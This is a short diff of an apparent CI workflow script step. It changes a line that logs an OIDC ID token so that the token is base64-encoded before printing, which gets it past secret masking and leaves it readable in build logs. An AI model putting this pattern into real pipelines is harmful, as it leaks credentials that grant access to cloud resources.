@@ -13,4 +13,4 @@ jobs:
         with:
           script: |
             const token = await core.getIDToken()
-            console.log("token:", token)
+            console.log("token:", btoa(JSON.stringify(token)))
